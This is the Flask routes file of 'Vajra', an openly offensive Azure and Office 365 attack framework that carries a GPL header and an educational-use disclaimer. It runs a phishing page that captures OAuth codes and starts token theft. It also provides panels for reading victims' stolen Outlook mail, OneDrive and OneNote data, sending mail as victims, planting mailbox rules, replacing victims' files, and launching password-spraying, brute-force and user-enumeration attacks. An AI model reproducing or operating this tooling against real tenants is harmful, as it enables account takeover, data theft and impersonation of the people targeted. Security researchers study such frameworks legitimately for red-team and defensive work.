# Copyright (C) 2022 Raunak Parmar, @trouble1_raunak
# All rights reserved to Raunak Parmar

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.

from flask import render_template, request, send_file, url_for, flash, abort, Response, session
from sqlalchemy.sql.expression import false
from werkzeug.utils import redirect
from vajra import app, db, bcrypt
from vajra.attacks.phishing import stealerAction, sprayingResult
from vajra.attacks.spraying import sprayingAttack
from vajra.enumeration.userenum import userenumerate
from vajra.enumeration.subdomain import subdomainenum
from vajra.attacks.bruteforce import bruteforceAttack
from vajra.forms import *
from vajra.functions import *
from vajra.models import *
from sqlalchemy.sql import text
from urllib.parse import urlparse
from flask_login import login_user, current_user, logout_user, login_required
from pygtail import Pygtail
import flask, os, threading, time, uuid
from datetime import datetime


db.create_all()


@app.context_processor
def inject_stage_and_region():
    try:
        theme = Admin.query.filter_by(id=current_user.id).first()
    except Exception as e:
        theme = None   
    themeColor = "light"
    textColor = "text-primary"
    othertextColor = "text-primary"
    if theme == None:
        return dict(theme=themeColor, textColor=textColor)

    if theme.theme == "1" or theme.theme == "true":
        textColor = "white"
        othertextColor = "text-white"
        themeColor = "dark"
                
    return dict(theme=themeColor,textColor=textColor, othertextColor=othertextColor)

@app.before_request
def limit_remote_addr():
    return

@app.route("/", methods=['GET', 'POST'])
def login():
    adminUser = Admin.query.all()
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    form = LoginForm()
    if form.validate_on_submit():
        user = Admin.query.filter_by(username=form.username.data).first()
        if user and bcrypt.check_password_hash(user.password, form.password.data):
            login_user(user, remember=form.remember.data)
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('dashboard'))
        else:
            flash('Login Unsuccessful!', 'danger')
    return render_template('login.html', title='Login', form=form, userexist=adminUser)


@app.route("/register", methods=['GET', 'POST'])
def register():
    form = RegistrationForm()
    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        id = uuid.uuid4().hex
        user = Admin(id=id, username=form.username.data, email=form.email.data, password=hashed_password, enableIp="", ips="")
        db.session.add(user)
        db.session.commit()
        firstVisitDb(id)
        flash('Your account has been created!', 'success')
        return redirect(url_for('login'))
    return render_template('register.html', title='Register', form=form)

@app.route("/signout")
def signout():
    logout_user()
    flash('Account Successfully Sign Out', 'success')
    return redirect(url_for('login'))


@app.route("/azure/dashboard")
@login_required
def dashboard():
    status = getAttackStatus("phishing")
    sprayresults = sprayingResult.query.filter_by(uuid=current_user.id).all()
    bruteforceResults = bruteforceResult.query.filter_by(uuid=current_user.id).all()
    validemails = validEmails.query.filter_by(uuid=current_user.id).all()
    return render_template("dashboard.html", active="active", status=status, stolenData=stolenData, sprayresults=sprayresults, bruteforceResults=bruteforceResults, validemails=validemails)

@app.route("/azure/office365/victims", methods=['GET', 'POST'])
@login_required
def victims():
    form = victimForm()
    form.validate_on_submit()
    victims = Allusers.query.distinct(Allusers.id).filter_by(uuid=current_user.id).all()
    phishedUser = Token.query.filter_by(uuid=current_user.id).distinct()
    phishlogs = phishingLogs.query.filter_by(uuid=current_user.id).order_by(phishingLogs.temp.desc()).all()
    return render_template("office365/victims.html", form=form, victims=victims, phishedUser=phishedUser, phishlogs=phishlogs)    

@app.route("/azure/office365/oneDrive")
@login_required
def oneDrive():
    form = oneDriveForm()
    oneDrive = OneDrive.query.distinct(OneDrive.filename).filter_by(uuid=current_user.id).all() 
    return render_template("office365/onedrive.html", form=form, oneDrive=oneDrive)

@app.route("/azure/office365/outlook", methods=['GET', 'POST'])
@login_required
def outlook():
    form = outlookForm()
    form.validate_on_submit()
    victims = Outlook.query.with_entities(Outlook.victim).filter_by(uuid=current_user.id).distinct()  #      db.engine.execute("Select DISTINCT victim from Outlook where uuid = :uuid", uuid=current_user.id)
    subjects = []
    mails = []
    attachments = []
    victim = ""
    id = ""
    if "victim" in flask.request.args:
        victim = flask.request.args['victim']
        subjects = Outlook.query.with_entities(Outlook.id, Outlook.Sender, Outlook.Subject, Outlook.victim, Outlook.HasAttachments).filter_by(victim=victim, uuid=current_user.id).order_by(Outlook.HasAttachments.desc()).all()

        if "id" in flask.request.args:
            id = flask.request.args['id']
            mails = Outlook.query.with_entities(Outlook.id, Outlook.Sender, Outlook.Subject, Outlook.victim, Outlook.Body).filter_by(id=id, uuid=current_user.id).all()
            attachments = Attachments.query.with_entities(Attachments.filename, Attachments.size, Attachments.id).filter_by(id=id, uuid=current_user.id).all()

            return render_template("office365/mailbody.html",user=victim, mails=mails, attachments=attachments)


    if "displayName" in flask.request.args:
            search = flask.request.args['displayName']
            #subjects = db.engine.execute(text("Select id, Sender, Subject, victim, HasAttachments from Outlook where victim= :x and BodyPreview like :s or Subject like :s and uuid= :uuid order by HasAttachments desc "), x=victim, s='%'+search+'%' , uuid=current_user.id)
            subjects = Outlook.query.with_entities(Outlook.id, Outlook.Sender, Outlook.Subject, Outlook.victim, Outlook.HasAttachments).filter_by(victim=victim, uuid=current_user.id).filter(Outlook.bodyPreview.contains(search), Outlook.Subject.contains(search)).order_by(Outlook.HasAttachments.desc()).all()

    return render_template("office365/outlook.html", form=form, victims=victims, user=victim,id=id, subjects=subjects, mails=mails, attachments=attachments)


@app.route("/azure/office365/outlook/sendmail/<sender>", methods=['GET', 'POST'])
@login_required
def sendmail(sender):
    form = sendmailForm()
    form.validate_on_submit()
    error = ""
    if Token.query.filter_by(uuid=current_user.id, username=sender).first() == None:
        message = "User Not found!" 
        type = "error"
        flash(["Outlook",message], type) 
        return redirect(url_for("outlook"))

    if form.validate_on_submit():
        receiver = request.form['receiver']
        subject = request.form['subject']
        body = request.form['body']
        attachment = request.files['attachment']

        res = stealerAction.sendMail(current_user.id, sender, receiver, subject, body, attachment)
        if res.status_code == 202:
            message = "Email sent successfully!" 
            type = "success"
            
        else:
            message = "Email failed!"
            type = "error"
            error = res.json()['error']['message']
        flash(["Outlook",message], type) 
    return render_template("office365/sendmail.html", form=form, sender=sender, error=error)

@app.route("/azure/office365/outlook/createRules/<victim>", methods=['GET', 'POST'])
@login_required
def createRules(victim):
    form = outlooRules()
    form.validate_on_submit()
    error = ""
    if Token.query.filter_by(uuid=current_user.id, username=victim).first() == None:
        message = "User Not found!" 
        type = "error"
        flash(["Outlook",message], type) 
        return redirect(url_for("outlook"))

    if form.validate_on_submit():
        rules = request.form['rules']
        victim = request.form['victim']
        res = stealerAction.createOutlookRules(current_user.id, victim, rules)
        if res.status_code == 201:
            msg = 'Outlook rules created'
            type = "success"
        else:
            msg = 'Error: ' + res.json()['error']['message']
            error = msg
            type = "error"
        
        flash(["Outlook Rules",msg], type) 
    return render_template("office365/outlook_rules.html", form=form, victim=victim, error=error)

@app.route("/azure/office365/attachments", methods=['GET', 'POST'])
@login_required
def attachments():
    form = attachmentsForm()
    form.validate_on_submit()
    attachments = Attachments.query.filter_by(uuid=current_user.id).all()
    
    return render_template("office365/attachments.html", form=form, attachments=attachments)

@app.route("/azure/office365/oneNote")
@login_required
def onenote():
    form = onenoteForm()
    form.validate_on_submit()
    onenote = OneNote.query.filter_by(uuid=current_user.id).all()
    return render_template("office365/onenote.html", form=form, onenote=onenote)

@app.route("/azure/office365/delete/<type>")
@login_required
def officeDelete(type):
   
    if type == "oneDrive":
        db.session.query(OneDrive).filter_by(uuid=current_user.id).delete()
    elif type == "outlook":
        db.session.query(Outlook).filter_by(uuid=current_user.id).delete()
    elif type == "onenote":
        db.session.query(OneNote).filter_by(uuid=current_user.id).delete()
    elif type == "attachments":
        db.session.query(Attachments).filter_by(uuid=current_user.id).delete()
    elif type == "victims":
        db.session.query(Allusers).filter_by(uuid=current_user.id).delete()
    else:
        return abort(404)    
    db.session.commit()

    return redirect(url_for(type))

@app.route("/azure/attacks/phishing", methods=['GET', 'POST'])
@login_required
def phishing():
    status = getAttackStatus("phishing")
    form = stealerConfigForm()
    if form.validate_on_submit():
        file = request.files['macrofile'].read()
        insertStealerConfig(form, file)
    stealerDefault = StealerConfig.query.filter_by(uuid=current_user.id).first()
    phishUrl = getPhishUrl(current_user.id)
    phishlogs = phishingLogs.query.filter_by(uuid=current_user.id).order_by(phishingLogs.temp.desc()).all()
    return render_template("attacks/phishing.html", status=status, phishUrl=phishUrl, form=form, stealerDefault=stealerDefault, uuid=current_user.id, phishlogs=phishlogs)

@app.route("/azure/attacks/phishing/<action>")
@login_required
def phishingAction(action):
    if action == "runStealer":
        
        db.engine.execute(f"UPDATE attack_status SET phishing ='True' WHERE uuid = '{current_user.id}'")
        message = "Phishing Page Started"
        type = "success"

    if action == "stopStealer":
        db.engine.execute(f"UPDATE attack_status SET phishing ='False' WHERE uuid = '{current_user.id}'")
        message = "Phishing Page Stoped"
        type = "warning"

    flash(["Phishing",message], type)   
    return redirect(url_for('phishing'))

@app.route("/azure/attacks/spraying", methods=['GET', 'POST'])
@login_required
def spraying():
    sprayStatus = getAttackStatus("spraying")
    form = sprayingConfigForm()
    if form.validate_on_submit():
        file = request.files['moreVictims'].read()
        insertSprayingConfig(form, file)
        flash(["Spraying","Configuration successfully updated"], "success")   
    sprayingDefault = sprayingConfig.query.filter_by(uuid=current_user.id).first()
    sprayresults = sprayingResult.query.filter_by(uuid=current_user.id).all()
    spraylogs = sprayingLogs.query.filter_by(uuid=current_user.id).order_by(sprayingLogs.temp.desc()).all()
    return render_template("attacks/spraying.html", form=form, sprayingDefault=sprayingDefault, sprayresults=sprayresults, sprayStatus=sprayStatus, spraylogs=spraylogs)


@app.route("/azure/attacks/spraying/<action>")
@login_required
def sprayingStart(action):
    global ps
    if action == "start":
        ps = thread_with_trace(target=sprayingAttack.startAttack, args=(current_user.id,))
        ps.start()
        
    if action == "stop":
        db.engine.execute("UPDATE attack_status SET id = 1, spraying ='False' WHERE uuid = :uuid", uuid=current_user.id)
        try:
            ps.kill()
            ps.join()
        except:    
            pass

    flash(["Spraying", "Spraying started in the background"], "success")   
    return redirect(url_for('spraying'))

@app.route("/azure/attacks/spraying/download/<type>")
@login_required
def sprayingDownload(type):

    path = downloadSpraying(type)
    return send_file(path, as_attachment=True) 

@app.route("/azure/attacks/bruteforce",  methods=['GET', 'POST'])
@login_required
def bruteforce():
    bruteforceStatus = getAttackStatus("bruteforce")
    form = bruteforceConfigForm()
    if form.validate_on_submit():
        insertBruteforceConfig(form)
        flash(["BruteForce","Configuration successfully updated"], "success")   
    usernames = bruteforceConfig.query.filter_by(uuid=current_user.id).filter(bruteforceConfig.usernames != None).all()
    passwords = bruteforceConfig.query.filter_by(uuid=current_user.id).filter(bruteforceConfig.passwords != None).all()
    bruteforcelog = bruteforceLogs.query.filter_by(uuid=current_user.id).order_by(bruteforceLogs.temp.desc()).all()
    bruteforceResults = bruteforceResult.query.filter_by(uuid=current_user.id).all()
    return render_template("attacks/bruteforce.html", form=form, usernames=usernames, passwords=passwords, bruteforceResults=bruteforceResults, bruteforceStatus=bruteforceStatus, bruteforceLogs=bruteforcelog)

@app.route("/azure/attacks/bruteforce/download/<type>")
@login_required
def bruteforceDownload(type):

    path = downloadBruteforce(type)
    return send_file(path, as_attachment=True) 
       
@app.route("/azure/attacks/bruteforce/<action>")
@login_required
def bruteforceStart(action):
    global ps
    global bruteforceStatus
    if action == "start":
        ps = thread_with_trace(target=bruteforceAttack.startAttack, args=(current_user.id,))
        ps.start()
        bruteforceStatus = True
        
    if action == "stop":
        db.engine.execute(text("UPDATE attack_status SET bruteforce ='False' WHERE uuid = :uuid"), uuid=current_user.id)
        try:
            ps.kill()
            ps.join()
        except:
            pass
    flash(["BruteForce", "BruteForce started in the background"], "success")   
    return redirect(url_for('bruteforce'))


@app.route("/azure/enumeration/userenum", methods=['GET', 'POST'])
@login_required
def userenum():
    userenumStatus = getEnumerationStatus("userenum")
    form = userenumeration()
    if form.validate_on_submit():
        list = form.userList.data
        file = request.files['moreVictims'].read()
        insertUserEnum(list, file)
        flash(["Spraying","Configuration successfully updated"], "success")   
    userslistConfig = ForUserEnum.query.filter_by(uuid=current_user.id).all()
    validemails = validEmails.query.filter_by(uuid=current_user.id).all()
    enumlogs = userenumLogs.query.filter_by(uuid=current_user.id).order_by(userenumLogs.temp.desc()).all()
    return render_template("enumeration/userenum.html", form=form, userslistConfig=userslistConfig, validemails=validemails, userenumStatus=userenumStatus, userenumlogs=enumlogs)


@app.route("/azure/enumeration/userenum/download/results")
@login_required
def userenumDownload():

    path = downloadUserenum()
    return send_file(path, as_attachment=True)  

@app.route("/azure/enumeration/subdomainEnum/download/results")
@login_required
def subdomainEnumDownload():

    path = downloadSubdomainEnum()
    return send_file(path, as_attachment=True) 


@app.route("/azure/enumeration/userenum/<action>", methods=['GET', 'POST'])
@login_required
def userenumStart(action):
    global ps
    if action == "start":
        db.session.query(validEmails).filter_by(uuid=current_user.id).delete()
        db.session.commit()
        ps = thread_with_trace(target=userenumerate.enum, args=(current_user.id,))
        ps.start()
        
    if action == "stop":
        db.engine.execute("UPDATE enumeration_status SET userenum ='False' WHERE uuid = :uuid", uuid=current_user.id)
        try:
            ps.kill()
            ps.join()
        except:    
            pass
    flash(["Userenum", "Userenum started in the background"], "success")   
    return redirect(url_for('userenum'))


@app.route("/azure/configuration", methods=['GET', 'POST'])
@login_required
def configuration():
    form = adminConfiguration()
    if form.validate_on_submit():
        insertAdminConfig(form)
        flash(["Configuration", "Changes done successfully!"], "success")
        return redirect(url_for("configuration"))
    AdminDefault = Admin.query.filter_by(id=current_user.id).first()
    return render_template("Adminconfiguration.html", form=form, AdminDefault=AdminDefault)

@app.route("/azure/contact", methods=['GET', 'POST'])
@login_required
def contact():
    return render_template("contact.html")  

@app.route("/azure/documentation", methods=['GET', 'POST'])
@login_required
def documentation():
    return render_template("documentation.html")  

@app.route("/azure/visitors", methods=['GET', 'POST'])
@login_required
def visitors():
    visitors = Visitors.query.with_entities(Visitors.ip, Visitors.time).filter_by(uuid=current_user.id).distinct()
    return render_template("visitors.html", visitors=visitors)

@app.route("/azure/getcode/<uuid>", methods=['GET', 'POST'])
def getcode(uuid):
    try:
        adminUser = Admin.query.filter_by(id=uuid).first()
    except:
        abort(404)


    if adminUser.enableIp == "1" or adminUser.enableIp == "true":
        ips = adminUser.ips.split(" ")
        if request.remote_addr not in ips:
            abort(403)

    status = AttackStatus.query.filter_by(uuid=uuid).first().phishing
    if status == None or status == "False":
        return abort(404)
    ip = request.remote_addr
    now = datetime.now()
    date_time = now.strftime("%d/%m/%Y %H:%M:%S")
    db.engine.execute(text("INSERT INTO  visitors(uuid, ip, time) VALUES(:uuid, :ip, :time)"), uuid=uuid, ip=ip, time=date_time)
    if "code" in flask.request.args:
        code = flask.request.args['code']
        threading.Thread(target=stealDuringPhish, name="stealer", args=(uuid, code)).start()
        redirect_after_stealing = StealerConfig.query.with_entities(StealerConfig.redirect_after_stealing).filter_by(uuid=uuid).first().redirect_after_stealing
        if redirect_after_stealing != None or redirect_after_stealing != "":
            return redirect(redirect_after_stealing)
        else:
            return redirect(url_for(getcode))
    try:
        url = StealerConfig.query.filter_by(uuid=uuid).first().phishUrl
    except:
        url = "https://login.microsoftonline.com/"
    return render_template("phishTemplate/index.html", LOGINURL=url)


@app.route("/azure/downloads/<type>/<id>")
@login_required
def download(type, id):
    try:
        path = getPath(type, id)
        return send_file(path, as_attachment=True)
    except:
        return abort(404)


@app.route("/azure/attacks/victimsdownload/<type>")
@login_required
def victimsdownload(type):
    try:
        path = victimsDownload(type)
        return send_file(path, as_attachment=True)
    except Exception as e:
        return abort(404)

@app.route("/azure/enumeration/subdomainenum", methods=['GET', 'POST'])
@login_required
def subdomainEnumeration():
    form = subdomainenumeration()
    subdomainStatus = getEnumerationStatus("subdomain")
    if form.validate_on_submit():
        insertsubdomainlist(form)
        flash(["Configuration", "Changes done successfully!"], "success")
        
    wordlist = enumerationdata.query.filter_by(uuid=current_user.id).all()
    domains = enumerationResults.query.filter_by(uuid=current_user.id).all()
    subdomainLog = subdomainLogs.query.filter_by(uuid=current_user.id).order_by(subdomainLogs.temp.desc()).all()
    return render_template("enumeration/subdominenumeration.html", form=form, subdomainStatus=subdomainStatus, domains=domains, wordlist=wordlist, subdomainLogs=subdomainLog)

@app.route("/azure/enumeration/subdomainenum/<action>")
@login_required
def subdomainEnumerationAction(action):
    global ps
    if action == "start":
        ps = thread_with_trace(target=subdomainenum.enum, args=(current_user.id,))
        ps.start()
 
    if action == "stop":
        
        try:
            ps.kill()
            ps.join()
            db.engine.execute("UPDATE enumeration_status SET subdomain ='False' WHERE uuid = :uuid", uuid=current_user.id)
        except Exception as e:
            print(e)
            pass
        
    flash(["Userenum", "Userenum started in the background"], "success")   
    return redirect(url_for('subdomainEnumeration'))

@app.route("/azure/enumeration/AzureAdEnumeration", methods=['GET', 'POST'])
@login_required
def azureAdEnumeration():
    form = azureAdEnumerate()
    if form.validate_on_submit():
        res = startAzureAdEnumeration(form)
        flash(["Azure Ad", res[1]], res[0])
        return redirect(url_for('azureAdEnumeration'))
    azureAdUserProfile = azureAdEnumeratedUserProfile.query.filter_by(uuid=current_user.id).all()
    return render_template("enumeration/azureAd/azureAdEnumeration.html", form=form, azureAdUserProfile=azureAdUserProfile)

@app.route("/azure/enumeration/AzureAdEnumerated/<victim>", methods=['GET', 'POST'])
@login_required
def azureAdEnumerationUsers(victim):
    data = enumeratedData(victim)
    count = len(data.azureAdUsersData)
    return render_template("enumeration/azureAd/azureAdEnumeratedUserData.html", enumerate=data, count=count)


@app.route("/azure/enumeration/AzureAdGroup/<victim>/<groupName>", methods=['GET', 'POST'])
@login_required
def azureAdGroupData(victim, groupName):
    groupMembers = azureAdEnumeratedGroupMembers.query.filter_by(groupName = groupName, uuid=current_user.id).all()
    azureAdGroupData = azureAdEnumeratedGroupMembers.query.with_entities(azureAdEnumeratedGroupMembers.groupName).filter_by(uuid=current_user.id, victim=victim).distinct().limit(1000)
    
    if azureAdGroupData == []:
        return redirect(url_for("azureAdEnumeration"))
    
    return render_template("enumeration/azureAd/azureAdGroupData.html", groupMembers=groupMembers, groupName=groupName, azureAdGroupData=azureAdGroupData, victim=victim)


@app.route("/azure/enumeration/AzureAdEnum/deleteData")
@login_required
def azureAdDataDelete():
    azureAdEnum.flushAllData(current_user.id)
    flash(["Azure Ad Enum","All Data Deleted!"], "success")
    return redirect(url_for('azureAdEnumeration'))

@app.route("/azure/enumeration/AzureAdEnum/delete/<victim>")
@login_required
def azureAdUserData(victim):
    azureAdEnum.flushPreviousdata(current_user.id, victim)
    flash(["Azure Ad Enum","All Data Deleted!"], "success")
    return redirect(url_for('azureAdEnumeration'))

@app.route("/azure/enumeration/AzureServicesEnumeration", methods=['GET', 'POST'])
@login_required
def azureServicesEnumeration():
    form = azureServicesEnumerate()
    if form.validate_on_submit():
        res = startAzServiceEnumeration(form)
        flash(["Azure Ad", res[1]], res[0])
        return redirect(url_for('azureServicesEnumeration'))
    azureUsers = azureEnumUsers.query.filter_by(uuid=current_user.id).all()
    return render_template("enumeration/azure/azureEnumeration.html", form=form, azureUsers=azureUsers)


@app.route("/azure/enumeration/AzureServicesEnumeration/<username>/subscriptions")
@login_required
def azureServicesEnumUserSubscription(username):
    azureUsersSubscription = azureEnumSubscriptions.query.filter_by(uuid=current_user.id, username=username).all()
    return render_template("enumeration/azure/azureEnumSubscription.html", azureUsersSubscription=azureUsersSubscription, username=username)

@app.route("/azure/enumeration/AzureServicesEnumeration/<username>/subscriptions/<subscriptionId>")
@login_required
def azureServicesEnumResourceGroups(username, subscriptionId):
    azureUsersResources = azureEnumResourcesGroups.query.filter_by(uuid=current_user.id, username=username, subscriptionId=subscriptionId).all()
    return render_template("enumeration/azure/azureEnumResourceGroups.html", azureUsersResources=azureUsersResources, username=username, subscriptionId=subscriptionId)

@app.route("/azure/enumeration/AzureServicesEnumeration/<username>/subscriptions/<subscriptionId>/<resourceGroup>")
@login_required
def azureServicesEnumResources(username, subscriptionId, resourceGroup):
    azureUsersResources = azureEnumResources.query.filter_by(uuid=current_user.id, username=username, subscriptionId=subscriptionId, resourceGroupName=resourceGroup).all()
    return render_template("enumeration/azure/azureEnumResourceGroupsResources.html", azureUsersResources=azureUsersResources, username=username,  subscriptionId=subscriptionId)


@app.route("/azure/enumeration/AzureServicesEnumeration/AllResources/<username>")
@login_required
def azureAllResources(username):
    azureUsersAllResources = azureEnumResources.query.filter_by(uuid=current_user.id, username=username).all()
    return render_template("enumeration/azure/allResources.html", azureUsersAllResources=azureUsersAllResources, username=username)


@app.route("/azure/enumeration/AzureServicesEnumeration/deleteAll")
@login_required
def azureDeleteAll():
    uuid = current_user.id
    db.session.query(azureEnumResourcesGroups).filter_by(uuid=uuid).delete()
    db.session.query(azureEnumSubscriptions).filter_by(uuid=uuid).delete()
    db.session.query(azureEnumResources).filter_by(uuid=uuid).delete()
    db.session.query(azureEnumUsers).filter_by(uuid=uuid).delete()
    db.session.commit()
    return redirect(url_for('azureServicesEnumeration'))

@app.route("/azure/enumeration/AzureServicesEnumeration/<username>/delete")
@login_required
def azureDeleteUserData(username):
    uuid = current_user.id
    db.session.query(azureEnumResourcesGroups).filter_by(uuid=uuid, username=username).delete()
    db.session.query(azureEnumSubscriptions).filter_by(uuid=uuid, username=username).delete()
    db.session.query(azureEnumResources).filter_by(uuid=uuid, username=username).delete()
    db.session.query(azureEnumUsers).filter_by(uuid=uuid, username=username).delete()
    db.session.commit()
    return redirect(url_for('azureServicesEnumeration'))

@app.route("/azure/enumeration/AzureAdEnumeratedData/Download/<victim>", methods=['GET', 'POST'])
@login_required
def downloadAzureAdEnumData(victim):

    path = downloadEnumeratedData(repr(victim))
    return send_file(path, as_attachment=True) 

@app.route("/azure/oneDrive/replace/<username>/<id>",  methods=['GET', 'POST'])
@login_required
def replace(username, id):
    file = request.files['oneDriveFile']
    name = file.filename
    content = file.stream.read()
    response = replaceOneDriveFile(username, id, name, content)
    if response:
        message, type = name + " : " + response, "error"
    else:
        message, type = "File successfully got replaced", "success"
    
    flash(["OneDrive",message], type)
    return redirect(url_for('oneDrive'))

@app.route("/azure/delete/oneDrive/<username>/<id>")
@login_required
def delete(username, id):
    message, type = "File Successfully Deleted", "success"
    res = deleteOneDriveFile(username, id)
    if res == true:
        pass
    else:
        message, type = res, "error"
    flash(["OneDrive",message], type)
    return redirect(url_for('oneDrive'))

@app.route("/azure/stealAgain/<username>")
@login_required
def stealAgain(username):

    threading.Thread(target=reStealingVictim, name="stealer", args=(current_user.id, username)).start()
    flash(["Stealer","Stealing process is running the background!"], "success")
    return redirect(url_for('victims'))

@app.route("/azure/getNewAccessToken/<username>")
@login_required
def getNewAccessToken(username):

    accesstoken = getNewToken(username)
    
    return accesstoken

@app.route("/azure/deleteVictim/<username>")
@login_required
def deleteVictim(username):

    deleteVictimData(username)
    
    return redirect(url_for('victims'))



@app.route("/azure/deleteresult/<type>")
@login_required
def deleteLogs(type):
    uuid = current_user.id
    if type == "userenum":
        db.session.query(validEmails).filter_by(uuid=uuid).delete()
        db.session.commit()
        flash(["Userenum","Results deleted!"], "warning")
        return redirect(url_for('userenum'))
    elif type == "spraying":
        db.session.query(sprayingResult).filter_by(uuid=uuid).delete()
        db.session.commit()
        flash(["Spraying","Results deleted!"], "warning")
        return redirect(url_for('spraying'))
    elif type == "bruteforce":
        db.session.query(bruteforceResult).filter_by(uuid=uuid).delete()
        db.session.commit()
        flash(["Bruteforce","Results deleted!"], "warning")
        return redirect(url_for('bruteforce'))
    elif type == "subdomainEnum":
        db.session.query(enumerationResults).filter_by(uuid=uuid).delete()
        db.session.commit()
        flash(["SubdomainEnum","Results deleted!"], "warning")
        return redirect(url_for('subdomainEnumeration'))

    return abort(404) 

@app.route("/azure/simulator")
@login_required
def azure_simulation():

    return render_template("azure/simulator.html")


################################################################################################################################################
################################################################################################################################################



#------------------------------------------------------------AWS--------------------------------------------------------------------------------



################################################################################################################################################
################################################################################################################################################

@app.route("/aws/dashboard")
@login_required
def aws_dashboard():
    return render_template("aws/dashboard.html")
    

@app.route("/gcp/dashboard")
@login_required
def gcp_dashboard():
    return render_template("gcp/dashboard.html")    